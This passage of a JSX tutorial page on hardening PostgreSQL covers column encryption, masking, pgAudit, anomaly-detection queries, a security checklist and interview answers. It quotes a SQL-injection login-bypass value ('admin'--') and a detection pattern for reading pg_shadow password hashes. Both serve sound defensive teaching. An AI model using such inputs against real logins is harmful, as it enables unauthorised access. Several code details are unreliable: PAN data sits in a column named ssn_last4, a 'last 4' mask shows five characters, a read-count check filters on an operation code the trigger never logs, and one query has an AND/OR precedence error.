    pgp_sym_encrypt('1234567890123456', 'encryption_key_from_vault')
);

-- Decrypt on select (only if application knows the key):
SELECT name, email,
       pgp_sym_decrypt(ssn_last4::bytea, 'encryption_key_from_vault') AS pan_plain
FROM customers
WHERE customer_id = 42;

-- HASH sensitive lookup fields (cannot decrypt — for equality checks only):
INSERT INTO customers (email_hash, email_encrypted)
VALUES (
    crypt('rahul@email.com', gen_salt('bf', 12)),  -- bcrypt hash for lookup
    pgp_sym_encrypt('rahul@email.com', 'key')       -- encrypted for display
);
-- Lookup: WHERE email_hash = crypt('rahul@email.com', email_hash)

-- ─────────────────────────────────────────────────────────────────
-- KEY MANAGEMENT — the hardest part of encryption
-- ─────────────────────────────────────────────────────────────────
-- Encryption is only as strong as key management
-- Storing the key next to the encrypted data defeats the purpose

-- NEVER: store encryption keys in the database you're encrypting
-- NEVER: store encryption keys in application code or config files
-- ALWAYS: use a dedicated key management service (KMS)

-- AWS KMS: generate and manage keys, never expose raw key material
-- The key never leaves KMS. Instead, you send plaintext → KMS returns ciphertext.
-- To decrypt: send ciphertext to KMS → KMS returns plaintext (if IAM allows).

-- HashiCorp Vault Transit secrets engine:
-- vault write transit/encrypt/customer-data plaintext=$(base64 <<< "ABCDE1234F")
-- vault write transit/decrypt/customer-data ciphertext="vault:v1:abc..."
-- Keys are managed by Vault, application never sees raw key material`}
        </CodeBox>

        <SubTitle>Encryption in Transit — Protecting Data on the Network</SubTitle>

        <CodeBox label="TLS verification and certificate management">
{`-- ─────────────────────────────────────────────────────────────────
-- VERIFY TLS IS ACTIVE on all connections
-- ─────────────────────────────────────────────────────────────────
SELECT pid, ssl, version, cipher, bits,
       pg_authid.rolname AS username,
       client_addr
FROM pg_stat_ssl
JOIN pg_stat_activity USING (pid)
LEFT JOIN pg_authid ON pg_stat_activity.usesysid = pg_authid.oid
WHERE ssl = false;  -- find any non-SSL connections — should return 0 rows

-- ─────────────────────────────────────────────────────────────────
-- CERTIFICATE ROTATION PROCEDURE (zero-downtime)
-- ─────────────────────────────────────────────────────────────────
-- 1. Generate new server certificate (keep old one active):
openssl req -new -key server.key -out server.csr
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -days 365 -out server_new.crt

-- 2. Add new cert to postgresql.conf (dual-cert period):
ssl_cert_file = 'server_new.crt'

-- 3. Reload PostgreSQL (existing connections keep old cert, new ones use new):
pg_ctl reload

-- 4. After all connections have cycled, remove old cert reference

-- ─────────────────────────────────────────────────────────────────
-- DATA MASKING — show partial data to reduce exposure
-- ─────────────────────────────────────────────────────────────────
-- Masking in queries (for display purposes):
SELECT
    name,
    -- Show only last 4 digits of PAN: XXXXX1234F
    'XXXXX' || RIGHT(ssn_last4, 5) AS masked_pan,
    -- Show only domain of email: r***@email.com
    LEFT(email, 1) || '***@' || SPLIT_PART(email, '@', 2) AS masked_email,
    -- Show only last 4 digits of account: XXXX-XXXX-XXXX-3456
    'XXXX-XXXX-XXXX-' || RIGHT(account_number, 4) AS masked_account
FROM customers;

-- DYNAMIC DATA MASKING in production:
-- Create a masking view for non-privileged roles:
CREATE VIEW customers_masked AS
SELECT
    customer_id, name, city,
    'XXXXX' || RIGHT(ssn_last4, 5)                    AS ssn_last4,
    LEFT(email,1) || '***@' || SPLIT_PART(email,'@',2) AS email
FROM customers;

GRANT SELECT ON customers_masked TO support_role;
REVOKE ALL    ON customers        FROM support_role;
-- Support team can look up customers by city/name but never sees PAN or full email`}
        </CodeBox>
      </section>

      {/* ========================================
          PART 6 — AUDITING
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 06 — Auditing" />
        <SectionTitle>Auditing — Detecting and Proving What Happened</SectionTitle>

        <Para>
          Auditing records who accessed or modified what data, when, and from where.
          It serves two purposes: detection (notice an attacker exfiltrating data
          before damage is complete) and forensics (prove exactly what happened
          after an incident). For financial systems and regulated industries
          (banking, healthcare, e-commerce), auditing is a legal requirement.
        </Para>

        <SubTitle>pgAudit — Comprehensive Query Logging for PostgreSQL</SubTitle>

        <CodeBox label="pgAudit setup and configuration">
{`-- ─────────────────────────────────────────────────────────────────
-- SETUP pgAudit EXTENSION
-- ─────────────────────────────────────────────────────────────────

-- Install (requires adding to shared_preload_libraries):
-- In postgresql.conf:
shared_preload_libraries = 'pgaudit'
pgaudit.log = 'write, ddl, role'
-- Audit levels:
-- read:   SELECT, COPY FROM
-- write:  INSERT, UPDATE, DELETE, TRUNCATE, COPY TO
-- ddl:    CREATE, ALTER, DROP
-- role:   GRANT, REVOKE, CREATE ROLE, ALTER ROLE, DROP ROLE
-- misc:   DISCARD, FETCH, CHECKPOINT, VACUUM, SET
-- all:    everything (very verbose)

-- SESSION-LEVEL audit (all queries by current session):
SET pgaudit.log = 'all';

-- OBJECT-LEVEL audit (only specific tables — more targeted):
CREATE ROLE audit_role;
GRANT SELECT, INSERT ON payments TO audit_role;
ALTER ROLE audit_role SET pgaudit.log = 'read, write';
-- Now all access to payments table by any user is logged

-- ─────────────────────────────────────────────────────────────────
-- AUDIT LOG FORMAT
-- ─────────────────────────────────────────────────────────────────
-- pgAudit writes to the PostgreSQL log:
-- AUDIT: SESSION,1,1,READ,SELECT,TABLE,public.payments,
--        "SELECT * FROM payments WHERE customer_id = 42",<not logged>
-- Fields: AUDIT_TYPE, STATEMENT_ID, SUBSTATEMENT_ID, CLASS, COMMAND,
--         OBJECT_TYPE, OBJECT_NAME, STATEMENT, PARAMETER

-- EXAMPLE AUDIT LOG ENTRY:
-- 2024-03-15 14:32:01.234 IST [pid=12345] app_user@myapp
-- LOG: AUDIT: SESSION,1,1,WRITE,UPDATE,TABLE,public.orders,
--      "UPDATE orders SET status='delivered' WHERE order_id=5001",<not logged>

-- ─────────────────────────────────────────────────────────────────
-- APPLICATION-LEVEL AUDIT TABLE (complement to pgAudit)
-- ─────────────────────────────────────────────────────────────────
-- For business-level auditing (who in the application changed what):
CREATE TABLE audit_log (
    audit_id        BIGSERIAL PRIMARY KEY,
    table_name      TEXT NOT NULL,
    operation       CHAR(1) NOT NULL,  -- I, U, D
    record_id       BIGINT NOT NULL,
    old_values      JSONB,
    new_values      JSONB,
    changed_by_db   TEXT NOT NULL DEFAULT SESSION_USER,
    changed_by_app  INT,              -- application user ID from session variable
    changed_at      TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    client_ip       INET,
    application     TEXT
);

-- Generic audit trigger function:
CREATE OR REPLACE FUNCTION generic_audit_trigger()
RETURNS TRIGGER LANGUAGE plpgsql AS $$
DECLARE
    v_app_user_id INT;
    v_client_ip   INET;
BEGIN
    BEGIN
        v_app_user_id := current_setting('app.user_id')::INT;
        v_client_ip   := current_setting('app.client_ip')::INET;
    EXCEPTION WHEN OTHERS THEN
        v_app_user_id := NULL;
        v_client_ip   := NULL;
    END;

    INSERT INTO audit_log (
        table_name, operation, record_id,
        old_values, new_values,
        changed_by_app, client_ip, application
    )
    VALUES (
        TG_TABLE_NAME,
        LEFT(TG_OP, 1),
        CASE TG_OP WHEN 'DELETE' THEN (row_to_json(OLD)->>'id')::BIGINT
                   ELSE (row_to_json(NEW)->>'id')::BIGINT END,
        CASE WHEN TG_OP IN ('UPDATE','DELETE') THEN row_to_json(OLD)::JSONB END,
        CASE WHEN TG_OP IN ('INSERT','UPDATE') THEN row_to_json(NEW)::JSONB END,
        v_app_user_id, v_client_ip,
        current_setting('application_name', true)
    );

    RETURN COALESCE(NEW, OLD);
END;
$$;

-- Apply to sensitive tables:
CREATE TRIGGER audit_payments
AFTER INSERT OR UPDATE OR DELETE ON payments
FOR EACH ROW EXECUTE FUNCTION generic_audit_trigger();

CREATE TRIGGER audit_customers
AFTER INSERT OR UPDATE OR DELETE ON customers
FOR EACH ROW EXECUTE FUNCTION generic_audit_trigger();`}
        </CodeBox>

        <SubTitle>Anomaly Detection — Alerting on Suspicious Query Patterns</SubTitle>

        <CodeBox label="Query anomaly detection — finding suspicious behaviour">
{`-- ─────────────────────────────────────────────────────────────────
-- DETECT SUSPICIOUS PATTERNS IN AUDIT LOGS
-- ─────────────────────────────────────────────────────────────────

-- 1. MASS DATA EXTRACTION: user reading far more rows than normal
SELECT changed_by_app, COUNT(*) AS reads_in_last_hour
FROM audit_log
WHERE operation = 'R'
  AND table_name = 'customers'
  AND changed_at >= NOW() - INTERVAL '1 hour'
GROUP BY changed_by_app
HAVING COUNT(*) > 10000  -- threshold: 10K reads in an hour is unusual
ORDER BY reads_in_last_hour DESC;

-- 2. ACCESS OUTSIDE BUSINESS HOURS: production DB access at 3am
SELECT changed_by_app, changed_by_db, table_name, operation, changed_at
FROM audit_log
WHERE EXTRACT(HOUR FROM changed_at AT TIME ZONE 'Asia/Kolkata')
      NOT BETWEEN 8 AND 20  -- outside 8am-8pm IST
  AND changed_at >= NOW() - INTERVAL '24 hours'
  AND table_name IN ('payments', 'customers', 'pan_details')
ORDER BY changed_at DESC;

-- 3. PRIVILEGE ESCALATION ATTEMPT: user trying to access tables they shouldn't
SELECT usename, query, query_start
FROM pg_stat_activity
WHERE state = 'active'
  AND query ILIKE '%pg_shadow%'  -- trying to read password hashes
   OR query ILIKE '%information_schema%'  -- probing schema structure
   OR query ILIKE '%pg_roles%';  -- checking role permissions

-- 4. REPEATED FAILED LOGIN ATTEMPTS (from PostgreSQL log):
grep "authentication failed" /var/log/postgresql/postgresql.log \
    | awk '{print $NF}' | sort | uniq -c | sort -rn | head -20
-- Shows IP addresses with most authentication failures — brute force detection

-- 5. MONITOR LONG-RUNNING QUERIES (potential data exfiltration):
SELECT pid, usename, state, query_start,
       NOW() - query_start AS duration,
       LEFT(query, 200) AS query_preview
FROM pg_stat_activity
WHERE state = 'active'
  AND NOW() - query_start > INTERVAL '5 minutes'
ORDER BY duration DESC;

-- TERMINATE suspicious long-running query:
SELECT pg_terminate_backend(pid)
FROM pg_stat_activity
WHERE pid = 12345;`}
        </CodeBox>
      </section>

      {/* ========================================
          PART 7 — WHAT THIS LOOKS LIKE AT WORK
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 07 — Real World" />
        <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: '.12em', textTransform: 'uppercase', color: 'var(--muted)', marginBottom: 12, fontFamily: 'var(--font-mono)' }}>💼 What This Looks Like at Work</div>
        <SectionTitle>The Security Audit — Hardening a Production PostgreSQL Database</SectionTitle>

        <Para>
          This is the checklist a security engineer or senior data engineer runs
          when auditing a production PostgreSQL database. Every item maps directly
          to a concept in this module.
        </Para>

        <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 12, padding: '24px 28px', marginBottom: 24 }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--accent)', background: 'rgba(0,230,118,0.1)', border: '1px solid rgba(0,230,118,0.2)', borderRadius: 6, padding: '4px 10px', fontFamily: 'var(--font-mono)', display: 'inline-block', marginBottom: 20, letterSpacing: '.1em', textTransform: 'uppercase' }}>
            PostgreSQL Production Security Hardening Checklist
          </div>

          <CodeBox label="Security audit — find and fix every common misconfiguration">
{`-- ═══════════════════════════════════════════════════════════════
-- SECTION 1: AUTHENTICATION AUDIT
-- ═══════════════════════════════════════════════════════════════

-- CHECK 1: Are there any trust or password (plain) auth methods?
-- Review pg_hba.conf manually for: trust, password, ident, peer (on non-local)
-- All remote connections should use: scram-sha-256 or cert

-- CHECK 2: Is SSL enforced?
SHOW ssl;  -- must be 'on'
-- Check pg_hba.conf: all remote entries should use 'hostssl' not 'host'

-- CHECK 3: Are there users with no password?
SELECT rolname FROM pg_roles
WHERE rolcanlogin = true
  AND rolpassword IS NULL
  AND rolname NOT IN ('postgres');  -- find users with no password set

-- CHECK 4: Are there superusers that shouldn't be?
SELECT rolname FROM pg_roles
WHERE rolsuper = true;
-- Should be ONLY postgres (and maybe one emergency break-glass account)
-- App users should NEVER be superusers

-- CHECK 5: Are passwords strong and recently set?
SELECT rolname, rolvaliduntil FROM pg_roles
WHERE rolcanlogin = true
  AND (rolvaliduntil IS NULL OR rolvaliduntil < NOW());
-- NULL expiry = password never expires = bad practice
-- Expired passwords = users may be using old/weak passwords

-- ═══════════════════════════════════════════════════════════════
-- SECTION 2: AUTHORISATION AUDIT
-- ═══════════════════════════════════════════════════════════════

-- CHECK 6: Does the app user have more privileges than needed?
SELECT grantee, table_name, privilege_type
FROM information_schema.role_table_grants
WHERE grantee = 'app_user'
  AND privilege_type IN ('TRUNCATE', 'REFERENCES', 'TRIGGER', 'DROP');
-- App users should NOT have TRUNCATE, ALTER, DROP privileges

-- CHECK 7: Can any user create objects in the public schema?
SELECT nspname, nspacl FROM pg_namespace WHERE nspname = 'public';
-- Look for '=UC/postgres' meaning PUBLIC has USAGE and CREATE
-- Fix: REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- CHECK 8: Are there tables with no RLS that should have it?
-- (manual review) — any table with customer PII, financial data, medical data
-- should have either RLS or view-based access control

-- ═══════════════════════════════════════════════════════════════
-- SECTION 3: NETWORK AND CONNECTIVITY AUDIT
-- ═══════════════════════════════════════════════════════════════

-- CHECK 9: Is PostgreSQL listening on all interfaces?
SHOW listen_addresses;
-- Should be specific IP or 'localhost' for internal apps
-- '*' means listening on all interfaces — check if firewall is in place

-- CHECK 10: What source IPs are currently connected?
SELECT client_addr, usename, application_name, state, COUNT(*)
FROM pg_stat_activity
GROUP BY client_addr, usename, application_name, state
ORDER BY COUNT(*) DESC;
-- Review unexpected IP addresses or application names

-- ═══════════════════════════════════════════════════════════════
-- SECTION 4: ENCRYPTION AUDIT
-- ═══════════════════════════════════════════════════════════════

-- CHECK 11: Are all connections using SSL?
SELECT COUNT(*) FILTER (WHERE ssl = false) AS unencrypted,
       COUNT(*) FILTER (WHERE ssl = true)  AS encrypted
FROM pg_stat_ssl
JOIN pg_stat_activity USING (pid)
WHERE state IS NOT NULL;
-- unencrypted should be 0

-- CHECK 12: Is storage encrypted? (check at infrastructure level)
-- AWS RDS: aws rds describe-db-instances | grep StorageEncrypted
-- Should return "StorageEncrypted": true

-- ═══════════════════════════════════════════════════════════════
-- SECTION 5: AUDIT TRAIL AUDIT
-- ═══════════════════════════════════════════════════════════════

-- CHECK 13: Is pgAudit installed and configured?
SELECT * FROM pg_extension WHERE extname = 'pgaudit';
SHOW pgaudit.log;  -- should include 'write' and 'ddl' at minimum

-- CHECK 14: Are audit logs being retained?
SHOW log_destination;
SHOW logging_collector;
SHOW log_rotation_age;
SHOW log_rotation_size;
-- Logs should be shipped to a centralised logging system (CloudWatch, ELK)
-- not just stored on the database server itself`}
          </CodeBox>
        </div>
      </section>

      {/* ========================================
          PART 8 — INTERVIEW QUESTIONS
          ======================================== */}
      <section style={{ marginBottom: 72 }}>
        <SectionTag text="// Part 08 — Interview Prep" />
        <SectionTitle>Database Security Interview Questions — Complete Answers</SectionTitle>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
          {[
            {
              q: 'What is SQL injection and how do you prevent it?',
              color: '#0078d4',
              a: 'SQL injection is a vulnerability where user-supplied input is concatenated directly into a SQL query string, allowing the attacker to inject arbitrary SQL code that changes the query\'s semantics. A classic example: if a login query is built as "SELECT * FROM users WHERE username=\'" + username + "\'", an attacker can supply username as "admin\'--" to comment out the password check, bypassing authentication entirely. More dangerous attacks use UNION to read data from other tables, or time-based blind injection to extract data one bit at a time without visible output. Prevention: always use parameterised queries (prepared statements). The SQL structure is sent to the database separately from the data values. The database engine never interprets parameter values as SQL code — even if they contain SQL syntax, they are treated as literal strings. In Python this is cursor.execute("SELECT * FROM users WHERE username=%s", (username,)). In Java it is PreparedStatement with setString(). ORMs like Django and SQLAlchemy use parameterised queries by default. Additional layers: least-privilege application accounts (injection can only do what the app user is allowed to do), error sanitisation (don\'t leak schema info in error messages), and WAF for detection.',
            },
            {
              q: 'Explain the principle of least privilege in database security.',
              color: 'var(--accent)',
              a: 'The principle of least privilege states that every user, process, or system should have access to exactly the minimum permissions needed to perform its function — nothing more. In database security this means: the application database user gets only SELECT, INSERT, UPDATE, DELETE on the specific tables the application uses — no TRUNCATE, no DROP, no ALTER, no access to other schemas or system tables. A reporting user gets only SELECT. An analytics user might get SELECT plus the ability to create temporary tables in a scratch schema. A DBA gets full access but only through specific monitored accounts. The practical benefit: when security fails (SQL injection, stolen credentials, compromised application server), least privilege limits the blast radius. An attacker who exploits SQL injection against the application account can only do what the application is allowed to do — they cannot drop tables, create backdoor users, or read sensitive tables the app doesn\'t need. In PostgreSQL, implement this with role-based access control: create roles with specific permission sets, assign users to roles, and use ALTER DEFAULT PRIVILEGES to ensure new tables get the right permissions automatically.',
            },
            {
              q: 'What is Row-Level Security and when would you use it?',
              color: '#f97316',
              a: 'Row-Level Security (RLS) is a PostgreSQL feature that defines policies controlling which rows a user can access or modify. When RLS is enabled on a table and a user queries it, the database automatically appends the policy\'s condition to every query as if it were a WHERE clause — transparently, at the engine level. The user cannot bypass this by writing a different query or exploiting SQL injection. Use RLS when: (1) Multi-tenant SaaS applications — each tenant must see only their own data. With RLS on a policy like "tenant_id = current_setting(\'app.tenant_id\')", every query automatically filters to the current tenant. (2) Row-level data access by role — healthcare where doctors see only their patients, financial systems where advisors see only their clients. (3) Soft-delete enforcement — rows with is_deleted=true are invisible to application users but visible to admin roles. The application sets a session variable identifying the current user, and RLS policies reference that variable. Table owners bypass RLS by default — use ALTER TABLE ... FORCE ROW LEVEL SECURITY to apply it to owners too. RLS complements column-level security (views or column grants) — together they form a comprehensive data access control layer entirely within the database.',
            },
            {
              q: 'What is the difference between authentication and authorisation?',
              color: '#8b5cf6',
              a: 'Authentication answers "who are you?" — it is the process of verifying the identity of a user or system attempting to connect. A database authenticates a connecting client by checking their password (SCRAM-SHA-256), validating a TLS certificate, or verifying through an external directory (LDAP). Authentication either succeeds (connection is established) or fails (connection is rejected). Authorisation answers "what are you allowed to do?" — it is the process of checking what operations an authenticated user has permission to perform. Once a user is authenticated, authorisation determines which tables they can query, which operations (SELECT, INSERT, etc.) they can perform, which schemas they can access, and which rows they can see (row-level security). Authentication happens once per connection. Authorisation is checked on every operation. Both must be correctly configured. Authentication failure: wrong password, blocked IP, expired certificate — cannot connect. Authorisation failure: connected successfully but the operation is denied (permission denied for table X). A common mistake: believing that strong authentication alone is sufficient security. An authenticated user with excessive privileges (authorisation failure) can still exfiltrate data, accidentally or maliciously.',
            },
            {
              q: 'How would you store and protect sensitive data like PANs and bank account numbers in a database?',
              color: '#facc15',
              a: 'Sensitive financial data like PANs and account numbers requires multiple protection layers. First, never store more than you need — if you only need to display the last 4 digits to identify a card, only store the last 4 digits. Second, for data you must store: use column-level encryption with pgcrypto (pgp_sym_encrypt) or preferably an external KMS like AWS KMS. The encryption key must never be stored in the same database or on the same server as the encrypted data. Third, for data used in lookups (find customer by PAN), store a one-way hash alongside the encrypted value — bcrypt or SHA-256 of the canonical form allows equality checks without decryption. Fourth, implement strict access control: create a dedicated role for PAN access, use RLS or views to restrict which application functions can see decrypted values, log all access to PAN-containing tables with pgAudit. Fifth, data masking for non-privileged users: support agents see XXXXX1234F not the full PAN. Sixth, at rest: ensure the database storage volume is encrypted (AWS RDS with KMS). In transit: require TLS with verify-full sslmode. This multi-layer approach ensures that compromising any single layer — stolen disk, compromised app server, SQL injection — does not expose plaintext sensitive data.',
            },
          ].map((item, i) => (
            <div key={i} style={{ background: 'var(--surface)', border: `1px solid ${item.color}30`, borderLeft: `4px solid ${item.color}`, borderRadius: 12, padding: '22px 26px' }}>
              <div style={{ fontSize: 14, fontWeight: 700, color: 'var(--text)', marginBottom: 12 }}>Q: {item.q}</div>
              <Para>{item.a}</Para>
            </div>
          ))}
        </div>
      </section>

      {/* ── KEY TAKEAWAYS ── */}
      <KeyTakeaways items={[
        'Database security has five layers, all of which must hold: Authentication (verify identity), Authorisation (verify permissions), Input validation (prevent SQL injection), Encryption (protect stored and transmitted data), and Auditing (detect and prove what happened). Compromising any one layer can defeat the others.',
        'Authentication methods in order of strength: trust (never in production), md5 (deprecated), scram-sha-256 (current standard), certificate/cert (strongest, no password). Configure pg_hba.conf to restrict source IPs per user and database, always use hostssl (TLS-only connections), and disable the postgres superuser from remote login.',
        'Principle of least privilege: application accounts get SELECT/INSERT/UPDATE/DELETE only on the tables they need. No TRUNCATE, no DROP, no ALTER, no superuser. Use ALTER DEFAULT PRIVILEGES so new tables automatically get the right permissions. REVOKE CREATE ON SCHEMA public FROM PUBLIC — this dangerous default allows any authenticated user to create tables.',
        'Row-Level Security (RLS): policies that automatically filter rows for every query on an RLS-enabled table. Engine-level enforcement — cannot be bypassed by SQL rewriting or injection. USING clause controls which rows are visible; WITH CHECK controls what values are allowed on insert/update. Use for multi-tenant isolation, user-specific data visibility, and soft-delete enforcement.',
        'SQL injection: user input concatenated into SQL strings changes query structure. Classic attacks: authentication bypass (admin\'--), UNION extraction, blind boolean/time-based, second-order, out-of-band DNS exfiltration. Prevention: always use parameterised queries. No exception. ORMs use them by default. For dynamic identifiers, use allowlists or format() with %I in PL/pgSQL.',
        'Encryption at rest: full disk encryption protects against physical theft. Column-level encryption (pgcrypto) protects against insider threats — DBA cannot read plaintext. Key management is the hard part — keys must live in a separate KMS (AWS KMS, HashiCorp Vault), never in the same database.',
        'Encryption in transit: always use TLS. Set ssl=on in postgresql.conf, use hostssl in pg_hba.conf to reject non-TLS connections. Application sslmode should be verify-full — anything less can be MITM attacked. Monitor pg_stat_ssl for any unencrypted connections (should be zero in production).',
        'Data masking: display partial data to reduce exposure. Support agents see XXXXX1234F not the full PAN. Implement via views that apply masking expressions, grant non-privileged roles access only to the masking view, revoke direct table access. Column-level GRANTs are an alternative: GRANT SELECT (employee_id, name) ON employees TO support_role.',
        'pgAudit extension: configure pgaudit.log = \'write, ddl, role\' minimum. Log all DML on sensitive tables (payments, PAN details, customer PII). Ship logs to centralised immutable storage (CloudWatch, ELK) immediately — logs on the database server can be deleted by a compromised DBA. Build anomaly detection queries: mass reads (>10K rows/hour), after-hours access, repeated authentication failures.',
        'Security hardening checklist: no trust/password auth methods → scram-sha-256 or cert. SSL enforced (hostssl only). No passwordless login users. No unnecessary superusers. App user has minimal privileges. REVOKE CREATE ON SCHEMA public FROM PUBLIC. RLS on PII tables. pgAudit configured. Storage encrypted. Credentials in secrets manager not in code.',
      ]} />

    </LearnLayout>
  )
}